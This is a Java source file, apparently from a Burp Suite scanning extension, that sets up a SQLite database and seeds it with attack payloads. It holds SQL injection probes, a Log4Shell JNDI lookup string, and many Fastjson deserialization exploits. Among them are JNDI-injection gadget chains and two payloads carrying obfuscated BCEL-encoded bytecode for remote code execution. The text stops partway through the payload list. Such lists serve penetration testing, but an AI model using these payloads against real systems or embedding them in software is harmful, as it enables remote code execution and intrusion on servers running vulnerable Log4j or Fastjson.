package burp.utils;

import java.io.File;
import java.sql.*;
import java.util.ArrayList;
import java.util.List;

public class DbUtils {
    public static String DB_NAME = "gather_dev.db";
    public static String DB_PATH = System.getProperty("user.home") + "/.gather/" + DB_NAME;
    public static String DB_URL = "jdbc:sqlite:" + DB_PATH;
    public static String DB_DRIVER = "org.sqlite.JDBC";

    static {

        try {
            Class.forName(DB_DRIVER);
        } catch (ClassNotFoundException e) {
            Utils.stderr.println(e.getMessage());
        }
        File file = new File(DB_PATH);
        if (!file.exists()) {
            create();
        }
    }

    public static Connection getConnection() throws SQLException {
        return DriverManager.getConnection(DB_URL);
    }

    // 如果数据库不存在，创建数据库
    public static void create() {
        // 判断数据库是否存在
        try {

            Connection connection = DriverManager.getConnection(DB_URL);
            Utils.stdout.println("init db success");
            List<String> sqls = new ArrayList<>();
            sqls.add("CREATE TABLE IF NOT EXISTS \"config\" (\n" +
                    "  \"id\" INTEGER,\n" +
                    "  \"module\" TEXT,\n" +
                    "  \"type\" TEXT,\n" +
                    "  \"value\" TEXT,\n" +
                    "  PRIMARY KEY (\"id\"),\n" +
                    "  UNIQUE (\"type\" ASC)\n" +
                    ");\n");
            sqls.add("CREATE TABLE IF NOT EXISTS \"sqli\" (\n" +
                    "  \"id\" INTEGER,\n" +
                    "  \"sql\" TEXT,\n" +
                    "  PRIMARY KEY (\"id\")\n" +
                    ");");
            sqls.add("CREATE TABLE IF NOT EXISTS \"perm\" (\n" +
                    "  \"id\" INTEGER,\n" +
                    "  \"domain\" TEXT,\n" +
                    "  \"low\" TEXT,\n" +
                    "  \"no\" TEXT,\n" +
                    "  PRIMARY KEY (\"id\")\n" +
                    ");");
            sqls.add("CREATE TABLE IF NOT EXISTS \"log4j\" (\n" +
                    "  \"id\" INTEGER,\n" +
                    "  \"type\" TEXT,\n" +
                    "  \"value\" TEXT,\n" +
                    "  PRIMARY KEY (\"id\")\n" +
                    ");");
            sqls.add("CREATE TABLE IF NOT EXISTS \"fastjson\" (\n" +
                    "  \"id\" INTEGER,\n" +
                    "  \"type\" TEXT,\n" +
                    "  \"url\" TEXT,\n" +
                    "  PRIMARY KEY (\"id\")\n" +
                    ");");
            sqls.add("INSERT INTO \"sqli\" VALUES (1, \"'\");");
            sqls.add("INSERT INTO \"sqli\" VALUES (2, \"''\");");
            sqls.add("INSERT INTO \"sqli\" VALUES (3, \"'''\");");
            sqls.add("INSERT INTO \"log4j\" VALUES (31, 'header', 'Cookies');");
            sqls.add("INSERT INTO \"log4j\" VALUES (32, 'header', 'X-Remote-Addr');");
            sqls.add("INSERT INTO \"log4j\" VALUES (33, 'payload', '${jndi:ldap://dnslog-url/}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (1, 'dns', '{\"@type\":\"java.net.Inet4Address\", \"val\":\"1.FUZZ\"}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (2, 'dns', '{\"xxxx\":{\"@type\":\"java.net.Inet4Address\", \"val\":\"2.FUZZ\"}}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (3, 'dns', '{\"@type\":\"java.net.Inet6Address\", \"val\":\"3.FUZZ\"}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (4, 'dns', '{\"xxxx\":{\"@type\":\"java.net.Inet6Address\", \"val\":\"4.FUZZ\"}}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (5, 'dns', '{\"@type\":\"java.net.InetSocketAddress\"{\"address\":, \"val\":\"5.FUZZ\"}}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (6, 'dns', '{\"xxxx\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":, \"val\":\"6.FUZZ\"}}}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (7, 'echo', '{\"xx\":{{\"@\\x74ype\":\"com.alibaba.fastjson.JSONObject\",\"name\":{\"@\\x74ype\":\"java.lang.Class\",\"val\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSources\"},\"c\":{\"@\\x74ype\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\",\"key\":{\"@\\x74ype\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassLoader\":{\"@\\x74ype\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driver\":\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5W$Jx$5cU$V$fe$efd2$efe$f2$b2M$9b4C$e9$be$a5$d9$86$96$a6$cb$a4$zm$d2$94$86$siiJKZT$5e$s$af$c9$b4$93y$e9$cc$9b$a6$c5$N$F7DQT$a0$80$a8h$8d$a0$o$ad8i$J$b4E$a5$mu$D$c5$NW$QTD$U7$E$a5$f1$bf$ef$cd$q$99d$da$fa$7df$b9$db9$f7l$f7$9c$ff$de$f7$c4$99$H$8f$DX$o$d6z$e1$c5$n$V$9f$f7$c2$83$B$d9$7cA$c5$3d$K$eeU$d0$97$87$7c$7cQ$$$7dI$c1$97$V$dc$e7$e5$fc$x$5e$dc$8f$c3r$d3$R$V_$95$c4$H$U$7cMER$c5$a0$82$a3r$e1$98$82$He$3f$e4E$Z$k$f2$e2a$i$97$cd$J$F$t$bd$98$8aC$K$k$f1b$g$Oy$f1u$7cC6$dfT$f1$a8$XW$e1$94$82$db$e4$fc1$V$8f$7bQ$87o$a9xB$c5i$F$dfV$f1$j$V$dfU$f1$3d$F$dfW$f1$a4$82$a7$f2$R$c0$Pd$f3C$VO$ab$f8$91$8a$l$x$f8$89$8a$9f$ca$8d$3fS$f1$8c$X$3f$c7$_$e4$e4$97$w$7e$a5$e2$d7$w$7e$a3$e2Y$V$cfy$f1$5b$3c$_$9b$X$bc$f8$j$7e$af$e0$P$K$5eT$f1G$_$d6$e1$r$_$g$f1$t$F$_$7b$b1A$g$d8$88$3f$cb$d1_T$bc$a2$e2$af$w$fe$s$F$3e$q$97$fe$ae$e0$l$K$fe$e9$c5$W$bc$w$9b$7fyq9$5eS$f1$ba$ec$ff$z$9b$ffH$de7$a4_gT$M$x$C$C$9e$95$e1h$d8Z$z$90S$b1p$9b$80$bb$d1$ec2$E$8aZ$c2Q$a3$z$d1$dbi$c4$b6$ea$9d$R$ae$f8Z$cc$90$k$d9$a6$c7$c2r$9eZt$5b$3d$e1$b8$c0$b4$96$90$d9$h$d8$a5$c7$ad$ddq3$g$d8$97$88$E$b6$9a$bd$n$ddj$K$f5$98$f5$Cy$fd$b1$b0e4$98$5d$H$E$a6T$b4$ec$d6$f7$e9$81$88$k$ed$Ol$ea$dcm$84$ac$fa$9d$N$b6$ea$7dzl$b1T4$81$ee$d0$$$W$u$ZCk$8c$e8$f1x$8aT$t0$7b$3c$a9$cd$b4$d6$9b$89hW$d3$fe$90$d1g$85$cdh$8aw$a9$c0$ac1$bcmf$7b$o$d4$d3jX$3d$e6$E$d6$8b$9cn$91$80kg$83$40A$bb$a5$87$f6$b4$ea$7d$b6$f7L1$s$97$9d$85$f7$KxG$f62$k$c5$8e$b8$cdzL$ef5$y$p$c6$a5$dcn$c3ZO$t$97gq$7f$ccJ$bb$V$LG$bb$eb$Xf$8b$c1$cc$JV$af$P$h$91$M$a3$7d$TE$J$f8$c7$y$c6$8c$5d$RJ$L$d8$3b$eb$V$nX$X$C$ea$caP$q$95$F$b9$d2_$3a$5c$3af$d3X$N9$a1$de$ae$U$X$cfj$d2$cel$K$5d$e1$e8$88$80$b0$Zh$8e$f6$r$y$S$N$bdW$S$3bc$C$e5$p$c4$86$c4$ae$5dF$cc$e8$dab$e8$5dFL$c6$9d$960$b3$5c$f1$ceL$cb$j$e9$N$89p$q$c5G$T$96$3b$dd$K$a7$5b$c6tnf$f0$9dM$J$x$i$J$b4$84$e3$e9$ecY$92$Z$9d$ad$3d$b4$a7$8b4$c5$88$86$98$f2$b6Q$f1D4$d0$h$8e$87$C$Nk$db$9b$96$$ir$u$92$a9$cb8$h$d3$3a$p$cd$qv$8c$LHJ$H1$86$f0$a2$I$X$c1$80XA$a0Pp$bd$or$ec$w$7f$99$a9$d3n$sb$nc$7dXVT$d1h$e1$d4JI$g$de$847$L$cc5c$dd$b5z$9f$k$ea1j$z$9b$a3V$3aX$db$99$d8U$dbp$c02$g$7b$S$d1$3d$9ap$8b$5cMx$E$L$5b$8d$h$96$q0$f5$8a$c6$V$86$sT$845$91$t$bc$M$d6$f8$3cc$8d$8d$$5G$z$a3$db$88$d1$G$91$af$IM$T$F$a2P$TE$a2XF$c4$dc$$$8bZ$T$rR$ce$cc$f3$V$lC$pYj$a3a$d36$d89w$kM$7fL$ef$T$98q$9e$82$d4$84OL$S$98$7e$ee$K$d0$c4dQ$y$ad$zefk$a2LL$d1D$b9$f0$L$94e$3f$d9$89$84$d4i$f2$b04q$81$98$aa$89$L$c54$3ak$d9$t$Z$d7$b0$l$H41$5d$cc$a0$e1$c6$7e$p$a4$89$99b$W$c7$3d$96E$t$3c$96$kc$993$d1F$cd$dc$92$88F$j$ac$f4H$ac$9cKHQz$f4hWDj$f7tG$ccN$3d$92$8a$cd$b8bcb$f4$c5$cc$90$R$8f$9b$S$40$K3$b3Z$T$b3$c5$i$e9$dd$5c$d6d$cc$d8$x$90O$d5$5b$8cx$l$R$88$da$f28$db$60$d7T$c6$n$3bU$q$a0$ad$NI55$8d2$a341O$cc$a7$5df$bc6J$c0R$c4$CMT$88$85$9a$a8$94$8ez$fa$c3$d1$$$b3$9ft$96$7e$z$bdfq$GB$9c$G$3a$c3$d1$40$bc$87$d3$9a$90$o$aa4Q$zj4$3c$$j$V$R$d0$c4E$82$uR$96$bd$ccY$d9Y$c0$nM$cb$b9$b4a$a3$3c$c4$c5$b2$n$e8O9$L$Ihb$89$98$a1$89$3aAD$979$98$a7wu$a5$5d$d6$gM$e6n$d4$aa$d1$TV$8f$s$96IGJF$p$d8$k$d2$a3Q$bb$9cGeov$82$9d$WN$dd$cb5$b1B$E$e5H$e2$d6Uk5$b1R$ac$d2$c4j$a9$f5$S$b1FC$Xd$a4Yi$bc$Y$ac$E$Pi$ea9$ee$c1$MG2p8$e3$84$i$d0H$a7Df$84$Y$f4$5df$ac$8dg$q0$af$e2$dc$d7F$faz$cc$8f$g$fd$cd$d1$b8$a5GC$dc5$b9$o$eb$d5$e2$de$da$b1$b9$89$Rb$d2$b0$C$o$3aO$ca$v$40$815Y$f4$ec$9c$a0ga$96$3b$c6$91$m$a5W4$cb$fb$bd$fcl$y$cc$b1pt$9f$b9$87$f6$ad$c8$f6$3a$98$b8$94$d5$J$95$d6$db$d60x$V$d9B$nk$o$ad$b1x$8c$ab$a9C$a89OD3$efN$3e$H$u$a2$3d$d1g$c4B$8e$d2$d2l$fb$e9w$B$TD$96$5b$3c$kv$kM$V$3b$e4r$8e$N$V$f3$b38$9c$d5$bb$82P$o$WcF$a7$f3$p$f3$qG$ae$b3BJu$s$97$c6$cc$EA$c9$9f$85$cf$s$c9k$8d$ccN6eJ$h$b9$c9$d5$Q$cbH$P$cb7$cd$d4$b1$866$f6$e8$b1vco$82w$a7Q$bf$90$f7$9e$3b$k$be$c6$b0$df$90$cd2$Q$cdY$5dP$c2$f1$a6$de$3e$eb$80$cd$b7$p$T$97$O$c4$z$a3$d7$B1$W$o$83$w$d9$e6$9f$e7DF$ec$cc$b7$cc$W$b3$df$885$ea$S$fb$c6$dc$60$84_$x$y$j$f4JtLOJ3$bcM$zSLEE$96$f7$ccX$d6$UF$d4g$e8H$z$3a$b1$cf$a8$d6$vi$3d$T$5eA$95$VY$J$d9$Th$d2$us$ea$99$qWUy$92$z$f6c$c9$a3$f7$f5$Z$d1$ff$n$85$c7$3f$a2T$cbL$df$IeY$7d$a7$9e$5cbG$cc$g$l$b4$d1H$94gwEn$d5$Sqc$9d$R$J$f7$f2$a1$40$b0$5dpv$eb$c6$a2$b2D$8c$a8$b1$dfr$w$3a$f5$88qW$y$dc$d9$80Y$fcr$f1B$fe$b8$f9$e9$c2$97$R$db$b7pv1$e4$a7$M$90$5b9$Iq$98$D$X$aef$ebe$P$U$90$b9$Q$3aG$9a$c3$84N$84l$w$f1$h9R$80x$8e$9f$91$b9$5c$7b$dd$e7$3a$8a$9c$b6$9a$q$dc$ad5$be$5c$cf$c3$f0t$e4$f8$94$f6$O$f7$R$a8$ed$j$b9$b2M$o$af$3a$f7ax$3br$aa$b8$ee$8c$86$90$df$913$I$8d$LrXu$5c$8e$c9Y$b0$bd2$89B_$91$db$WT$c3$95$e2J$b7$bd$a3$da$a6$O$e0$86$a0$db$e7$b3u$fa$s$b9$d3$ea$a8$a2$c6$9dRA$b6$d6$f3$Ji$fa$ff$85$i$b6ce$o$86$S$bb$l$c4d$c6FFq5$8a$d8N$e6$d7s$v$a3T$c6$cf$c8$v$a4$cf$qg9$y$f8q$N$$$c0$z$fc$88$7e$80k$83$b8$Q$c7$f8$n$7d$C$d3$f1$Mf$e05$cc$b6$p$bf$L$f2C$bd$9b$7d7$f5x$QA$P$c2$94oa$Nvc$PO$e8$W$k$aeC$bd$G$abR$d4c$a4F$d0K$wO$GQRa$8fL$f4$f1$q$a5$7cg$c7$J$d4$a7v$ec$r$7d$Kr$5eELA$ecU$acS$Q$7f$Dk$VX$K$S$d8$97$ca$9b$g$f4s$94$e7$a2D$e9$a9$cc$E$be$eb$9cL$c0$d3$ece$s$y$Xv$c0$YQ$ef$n$94$d5T$rQ$da$3a$80$82$a0$9b$b91$a5m$60$f8$c5$ea$c7$a0$N$a1$ac$a3j$Q$e5$t$aa$ddI$f8$ab$b9$e1$82$fb$a9$a0$A$93$Y$a7$b2T$fc$W3$ef$80y$b4s$3e$UT$90ZIz$V$e9$d5$8c$60$N$a3U$cb$c8$z$c2$5cr$d6$60$J$db$3a$3bfKhG9$ffw3$o2$C$cbG$o$b0$9cV$bf$95z$5cX$ca$I$bc$8d$bd$c2$fd$a3$R$u$81$fb$N$u$K$deN$af$db$U$bc$pO$3b$bb$ef$w$de$99$$$p$f7$j$9c$f9X$3c$X$Naj$H$8fr$e3$Q$a6$b1$9f$de$92$b3$ea$uf$q1$d37$eb$uf$9f$c4$i$e7$af$zg$a9$bb$d4$5ds$fcn$f1FM$a9$7bq0$d7$9f$7bJ$bc$e4$cfMbn$d0$e3$f7$f8$e6$r1$ffv$f1$MG$L8$3a$u$9e$f4$e7$fa$w$u$m$a8$f8$95G$b0$f0$a08$e9W$7c$95$5c$f0U$c9$a6$da$s$N$40$N$aa$D$e2$QI$b5$b6$b2$40P$cdY$9aW$9a$e7W$8f$81$af$e7$bb$c5u$7e$b54$ef$Y$W$b9$Q$f4$fa$bd$be$c5$v$892$bb$_$ceav3$b3$fd$K$H$5e$a6u0$df$n$yIUE$5d$bbMu$S$df$b7Tf$feI$d4IkO$89$e9$7en$5dv$bb$us$af$f2$7b$82$9ao$f9Q$acH$o$e8$ab$97$c6$c3O$y$a8$e3$9e$95$yq$df$wB$81_k$l$40Yju$b5$5c$bd$c4Y$N$W$i$c5$g$7fA$Sk$93h$I$W$O$a1$b1c$I$eb$3a$fc$85$be$a6A$ac$l$c4$a5$c1$o$R$y$k$c2$G$86$b69X$e2$_J$e2$b2$8e$60$f1$v$94$f9K$fc$c5Il$dc$ee$_$f1$b5$c8$7e$60$f8y$7f$be4$bf57m$3e$d58$3e$e4$a7$81$a7$ae$c3$d76$88M$a4$f8K$92$d8l$X$b3_$Z$c2$e5$d4$ba$a5$c3_0$I$$m$a5$v$83$b8$c2$b7$z$89$edI$5c$99D$c7Q$ecpB$b3$d3$J$8d$83l$p$b1$91$uV$82$c7$r$8cI$81$X$k$84g$Ay$d7$e7$89$813$fd$e9$89$9b$T$d7$A$dc$h$rv$f40$p$df$c1$f4$82$ab$caU$cb$de$c9$fd$p$ccq$b0$3aU$acD1$eb$daG4Y$c0$aa$5e$84$b5X$86$G$ae6$f2w$j$b6$a3$89$fc$eb$ve$D$e5l$a4$a4f$5c$8b$cbp$jZq$T6$e1$$l$c6$3dD$9e$p$d8$82$d3h$c7$x$d8$8a3$b8$82p$beM$b8$b1$5d$5c$82$xE$L$3a$c4$d5$d8$nB$d8$v$o$b8J$f4$f3$e1$ce$dc$W7$40$X$t$R$S$_$a0$cbU$82$3d$aeRD$5c$e5$d8$e4$9a$8e$3e$d7l$ecu$cd$c3$gW$V$f6$d3$ea$7eW$80$b5$sk$ef$q$x$f4Z$fap$z$de$F$95$9f$d5$Fx7$ed$e2$b3$lO$d1$a6$ebQ$40m$8f$e2$3dx$_$K$a9$f30$de$87$f7$a3$88$9a$ef$c3$H$c8WL$fd$87p$D$3e$c8J$bcG$98$b8$91u$eb$c5i$d1$8a$Pq$94$8f$9b$c5$8d$f80$fd$ca$c3M$e2$W$o$dcG$Y$9f$ab$c5$a3$ac$f4nVr$a3x$W$l$a5$U$P$96$89$97$Z$91$9b$89$B$95$$$c1J$bf$89$r$ac$ba$e6$e0c$f88m$yvM$c5$t$88$9b$fc$det$f9Y$cf$b7$f2$U$W$b8$dc$ac$ea$dbR8p$gE$c3$E$9b$5c$F$H$V$dc$$$U$cca$c0$86$Z$3eu$cc$8a$82$3b$U$dcI$88$E$87$9f$qp$U$w$b8K$9c$c1$ad6j$f2$ef$ce$z$K$3e5L$90$f2e$db$r$99G8$c9$a8$e0$d3$K$3ec$8f$ef$G$a6$N3D$da$b9$f7$81$b7$84$e7u$e4$O$d3$e3$f1$a6J$qF$D$ed$e2$j$8d$cf$da$X$fb$e7$fe$L$e1K$Q$9a$u$W$A$A\"}}:\"xxx\"}}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (8, 'echo', '{\"xx\":{{\"@\\x74ype\":\"com.alibaba.fastjson.JSONObject\",\"name\":{\"@\\x74ype\":\"java.lang.Class\",\"val\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSources\"},\"c\":{\"@\\x74ype\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\",\"key\":{\"@\\x74ype\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassLoader\":{\"@\\x74ype\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driver\":\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$5bx$U$d5$j$ff$9d$ece$ceN$s$d9$cd$G$84$nb$X$E$dc$40$b2$x$a8E6$U$81$I$EY$a2$cd$oi$a0$z$9d$9dL$b2$D$bb3$eb$ccl$I$b4U$dbz$a9m$d5$5e$b5$da$8b$d5$5e$a8$8aU$7b$d9$a0$U$ab$3e$f4$a1o$7e_$_O$7d$ec$a3O$fa$e4$d7$af$f8$3f$3b$b3$q$9b$5d$L$f96g$fe$f3$bf$9d$df$ffv$ce$fc$ed$7fo$be$F$e0V$bc$x$p$G$5d$c64$M$b1$ccp$cc$ca$u$c1$e48$v$e1$94$M$Je$J$V$Z$Wl$8e$w$c7$7d$i$O$87$cb$b1O$82$t$c45$8e9$8e$fd$i$a79$O$I$bdy$8e3$ige$7c$Z_$91$91$c0W9$ee$X$cf$H8$c68$k$e4$f8$g$c7$d7e$7c$D$P$89$e5a$Z$8f$e0Q$J$df$94$f0$Y$c7$b7dl$c4$b7el$c0w$q$3c$$cP$40$db$80$t$E$f5$q$c7w9$be$t$c8$ef$L$d0$3f$e0$f8$n$c7$8f8$9e$e2xZ$c2$8f$r$3c$c3$Q$ddiZ$a6$b7$8b$n$94$k$3c$ca$Q$k$b5$a7$N$86x$de$b4$8c$f1Z$a5h8G$b4b$998$c9$bc$adk$e5$a3$9ac$8a$f7$80$c9t$86$be$fcImN$cb$965k6$3bZ$d6$5cw$84$f8$V$865K$f8$8e1S6t$_$7b$d8$f0J$f6$b4P$b0$85$c7E$85$bb$8b$tIN$82$ae$caV$C$e1$Yn$95$Q9$c6$7d$M$b1Y$c3$h3$b4i$c3$n$da$5dB$T$7f$d21$3dA$87$f4$cat$ab$c3$82$e7$98$d6$y9$e4$ba$5d$a9h$d6$b4$cb$d0$7f$bc$93B$97i1$ac$f4$r$a6$9d$3dhUk$k$J$N$ad$o$84E$f2$be$fa$8apomf$c6p$8c$e9$89$G$G$92$87$cb$94$tRs$8b$Mj$9b$f7$bd5$b3$ec$ebEO$HH$c3$5e$c9$q$u$eb$f3$E$x$3b$a3$b9$deI$d7$b6$b2s$b5r$b6P$V$s$fb$f4$92$7d$c23$5c$91$8b$9e$82$a7$e9$a7$Ok$d5F$b6$a9Z$d4_$S$9e$a5$ee$a2N$92pH$c2O$gm$f08$d5$92A$$$d85G7$f6$9b$a20$x$96y$cb$Ih$K$b6$e3v$J$3fU$f03$fc$5c$c1s$f8$F$c3N$db$99$cd$b8$N$e5$ZG$ab$Y$a7m$e7T$e6$b4Q$cc$e8$b6$e5$Z$f3$5e$86jP$T$O$s$fc$e7$a8$cf$k$b3E$60$S$9eW$f0$C$7eI$fbQ1$C$8d$3d$k$c5$5e$ac$d1$ae$d4F$cbZC$c1$af$f0k$86$c4$f2$c2ST$K$7e$83s$M$bb$af$VO$c1p$e6$ca$j7$edn$60q$ab$b6$e5R$s$e4Ed$M$h$c5$c6$f3$Z$d7$b7$cd$94$3c$af$9a$Z$a3$a5$d5Y$L$40$bf$92$K$7e$x$80o$ba$9a$7ds$d7$b5$ad$8a$cb$e4$K$5e$c4K$M$ca$k$5d7$aa$de$f0$a8$a6$97$c8F$b2$dd$8cE$nKxY$c1y$bc$a2$e0wx$95z$7b$f2$e0$b8$82$d7$f0$3a$b5Y$96$e6M$ca$WM$x$eb$96$e8uX$97$f0$7b$F$7f$c0$l$V$fc$Ju$J$L$K$$$e0$N$86$eb$3a7$y$f5h$876o$caB$H$f6$k$S$z$f2$a6X$$2$ac$fa$84vV$f0g$bc$aa$e0$S$de$a29$96$v$8cFOX$de$b0V$f3J$K$fe$o$84o$e3$jB$w$ca$e8$95i$bcr$86$e3$d8$ce$d0$R$ea$fd$94V$ad$96M$5d$f3L$dbJ$9547e$d9$vc$5e$b0L$_U$n$nm$94$9a$b1$9dT$b6a$93a$88$cc$94k$o$dc$88$5e$b6En$fb$Xq$ed$9b$X$J$qO$M$a9$ab$N$U$cd$f1$t$jHM$9f$adyii$83$p$rb$91b$8f$5es$i$K$b6$f9$be$o$3d$98_$aeE$a3$bb$92$ba$$$Y$95F$e3$e7$ed$m$ff$z$eaKD$c2$a6$a3$80$O$ba2$R$N$O5p$ba$fd$Ik$f38$e2$l$8e$cd$d8vw$b09$def3$f8$ff$8e$eb$a8i$cd$d9$a7$u$f7$3b$d2$ed$87$f6$f1v$d6$60$a7$a3$bd$8f0$ddi$e8e$8d$fa$b1$89$ad$87$Ot1$F$aek6$$$94p$fa$98$b8$85$96$ce$df$Z$d73$w$feT$df$e3$d8U$c3$f1$ce$d0$m$5e$r$PWN$f7n$cf$be$b7JF$a3$9ah$9d$d6j$z$bd$p$yO3$zJ$f0$c0R$c7$a3$r$cd$v$883$c1$d2$8d$91$c1c$U$c2$a2l$a2fyf$a5y$c04_V$b6l$Q$b0$c5$3da$cc$h4$bb$e9t$87$xh$a9$FE$u$921$d2$b2U$c0d$e8$a5$adZ$gtUs$bb$b6$8bks$ba$a3$a0$c3$ee$94$ee$feE$e5$e0f$T$5c$$z9$df$b8$df$a24$97$86E$f5$g$be$a6$bc$_$de$7b$dc$b3$7d$W$91b$q$fc$$$eeo$9f$82$R$ac$c3$a7$e9$hE$fc$d1$b1$on$wZw$A$a1$3a$a2$e8$p$e6$3f7$_$80$5d$40W$j$a1d$b8$8eH$7eK2$g$ba$E$a9$O$7ex$88$R$V$abC$k$P$U$ba$7d$F$a5$a9$b0$r$d9$T$90$b9$f0$d0p$a0$9c$8b$a8$e1$xt4$b0$ec$r$cbd$3cL$caS$a1d$a2PG_N$KDI$n$ea$8f4ES$e1$40$ce$D$f9$K$n_$e9$ef$d3$97$8b$a91$82y$9d$ca$h$ab$e4$afj$94$3c$c7$c8$7c$VY$cao$p$91$93$a3$97h$edN$ae$be$A$b5$8e5$c9$81$3a$ae$7f$GI$b5$3b$94$5c$5bP$bb$c3$c9$h$K$e7$Q$X$af$9fj$bc$a6h$8d$a8r$e1$C$d6$a9$U$e5$fa$3an$cc$v$X$b1a$ea$o6N$a9Jr$d3$CnZ$40$3a$d7$c3r$bd$X18$b5$80$cd$b9$b8$daS$c7$96$a9$5c$ef_$JC$5c$a5$Q$87$s$d5xrX$3c$cf$5d$fe$8f$ca$d5H$c4$87$95$a1$a8$d4x$jY$BoR$8d$a9$91f$7e$Sj$a2$8e$9b$93$5b$97fFM$E$d1l$f3$d5$h$g$b7$E$JP$T$81i$c0$bf$b5$8d$7f$O$e1$fc$ebT$e50$7b$8f$fd$j$b7$n$84$iU$ffYl$a25$860z$e8$h$b8$X$D$88$d3$tn$S$5b$d1$8f$9dX$811$acB$B$abq$C$w$ceb$N$e9$P$d0$edx$3d$eaXK$X$d3$Nx$X$v$fc$L$eb$f1o$dc$88$f7$e9S$f8$D$b2$fe$_nb$5dH3$8e$cd$ac$XCl$A$c3$y$8b$M$db$86$y$h$c1$cdl$3f$b6$b2qlcS$b8$8d9$d8$ce$k$c0$ed$ecy$ec$60o$m$c7$de$c3$$B$b7$93$fd$Dw$60$84$90$9d$a7nL$b0w$I$cbg$I$fb$A$abc$XI$ba$b0$91$9d$c7n$ec$a1$u$c6$d8c$d8K$bc0$K$ec$7e$8c$S$_$82$T$e4$f7N$a2$a28$cb$s$b1$8f$a4$f4$cd$c3$b6c$3fQ$i$af$b1u8$40T$8c$90$7fD$R$k$84L$f8$3f$c4$5d8$84nB$5bG$k$87$a1$Q$e6$X0$8e$bb$d1C$c8$9f$c3$3d$a4$d7K$f8$9f$c2g1$818$a1$9e$a0$cc$ec$a1$ac$d1$b4$e0$I$ee$r$b4G$e9$dfC$f42$a5$40$910$v$e1s$S$a6$q$ik$ae$3e$e1$ff$8eK$f8$3c$d0$7d$Z$db$90$b8$W$5d$J_$90$f0$c5$G$7d$CX$7b$99$ca$c1$c8N$y_$SS$ac$d1$de$5d$u$7e$M$9c$80Y$e4$3a$N$A$A\"}}:\"xxx\"}}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (10, 'jndi', '{\"@\\\\x74ype\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"FUZZ\", \"autoCommit\":true}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (11, 'jndi', '{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"FUZZ\", \"autoCommit\":true}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (12, 'jndi', '{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"FUZZ\", \"autoCommit\":true}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (13, 'jndi', '{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"FUZZ\", \"autoCommit\":true}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (14, 'jndi', '{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"FUZZ\"}}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (15, 'jndi', '{\"aaa\":{\"@\\\\x74ype\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"FUZZ\"}}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (16, 'jndi', '{\"aaa\":{\"@\\\\x74ype\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": {\"@\\\\x74ype\":\"java.util.Properties\",\"UserTransaction\":\"FUZZ\"}}}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (17, 'jndi', '{\"aaa\":{\"@\\\\x74ype\":\"java.lang.AutoCloseable\",\"@\\\\x74ype\":\"oracle.jdbc.rowset.OracleJDBCRowSet\",\"dataSourceName\":\"FUZZ\",\"command\":\"111\"}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (18, 'jndi', '{\"aaa\":{\"@\\\\x74ype\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"is\":{\"@\\\\x74ype\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"FUZZ\",\"autoCommit\":true}}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (19, 'jndi', '{\"aaa\":{\"@\\\\x74ype\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":\"FUZZ\"}}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (20, 'jndi', '{\"aaa\":{\"@\\\\x74ype\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"FUZZ\"}}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (21, 'jndi', '{\"aaa\":{\"@\\\\x74ype\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"FUZZ\"}}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (22, 'jndi', '{\"aaa\":{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"FUZZ\"}}}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (23, 'jndi', '{\"bbb\":{\"@\\\\x74ype\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"FUZZ\",\"autoCommit\":true}}');");
            sqls.add("INSERT INTO \"fastjson\" VALUES (24, 'jndi', '{\"bbb\":{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"FUZZ\", \"autoCommit\":true}}');");
